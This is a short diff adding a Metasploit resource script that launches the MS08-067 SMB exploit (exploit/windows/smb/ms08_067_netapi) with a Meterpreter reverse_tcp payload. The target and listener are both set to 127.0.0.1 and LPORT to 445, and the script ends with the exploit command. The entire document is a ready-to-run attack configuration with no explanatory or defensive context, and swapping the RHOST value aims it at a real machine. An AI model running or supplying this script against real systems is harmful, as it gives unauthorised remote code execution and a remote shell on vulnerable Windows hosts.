@@ -1,0 +1,7 @@
+echo "Usage: msfconsole -r ms08_067.rc"
+use exploit/windows/smb/ms08_067_netapi
+set PAYLOAD windows/meterpreter/reverse_tcp
+set RHOST 127.0.0.1
+set LHOST 127.0.0.1
+set LPORT 445
+exploit
